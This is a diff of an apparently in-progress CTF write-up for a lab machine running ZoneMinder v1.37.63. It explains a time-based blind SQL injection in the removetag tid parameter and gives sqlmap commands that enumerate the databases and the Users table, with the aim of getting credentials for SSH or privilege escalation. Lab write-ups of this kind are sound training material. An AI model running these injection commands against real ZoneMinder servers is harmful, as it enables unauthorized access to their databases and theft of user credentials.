@@ -30,17 +30,6 @@ Here we land on a ZoneMinder CMS running version `v1.37.63` which has a known vu
 ```bash
 view=request&request=event&action=removetag&tid=1
 ```
-This works because the parameter `tid=1`. The Tag ID was being passed to a `DELETE` query in the ZoneMinder's database.
-### Service Enumeration
-
-<!-- Any other services worth noting — SMB, FTP, SSH banners, etc. -->
-
----
-
-## Source Code Analysis
-
-<!-- If source code is available — always download it. Document key findings. -->
-<!-- What files were interesting? What did you grep for? What logic is vulnerable? -->
 
 ---
 
@@ -48,25 +37,38 @@ This works because the parameter `tid=1`. The Tag ID was being passed to a `DELE
 
 ### The Plan
 
-<!-- One paragraph explaining your attack path before you execute it. -->
+The plan here is to deploy the payload via `sqlmap` and hunt down the database credentials potentially leading to us either escalating privileges in the CMS or being able to get a SSH connection via one of the users directly. 
 
 ### Vulnerability
 
-**Type**: <!-- e.g. Path Traversal, RCE, SQLi, Backdoor -->
-**Location**: <!-- File, endpoint, header, etc. -->
-**Why it works**: <!-- Brief technical explanation -->
+**Type**: Time-based blind SQL injection
+**Location**: URL parameter
+**Why it works**: This works because of the parameter `tid=1`. It was feeding directly into `TagID` with no sanitization. Then being passed to a `DELETE` query in the ZoneMinder's database. The reason it's `time-based blind` is because it never actually returns the data back to the page. So `sqlmap` can't actually read the characters directly, it had to deduce them, how?
+
+For every character it basically says "`IF` character > 'M' `SLEEP` for 1 second". And it continues until it finds the correct character.
 
 ### Steps
 
-1.
-2.
-3.
-
+1: Discover the names of the available databases.
 ```bash
-# Key commands here
+sqlmap --cookie="ZMSESSID=<SESSION_COOKIE>" -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' --dbs --batch
 ```
+**Result**: 
+- `information_schema`
+- `performance_schema`
+- `zm`
 
-**Result**: Shell as `user`
+2: Discover names of each table in the database.
+```shell
+sqlmap --cookie="ZMSESSID=<SESSION_COOKIE>" -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' -D zm --tables --batch
+```
+**Result**: Key tables we found. `Users`.
+
+
+3:
+```shell
+
+```
 
 ---
 
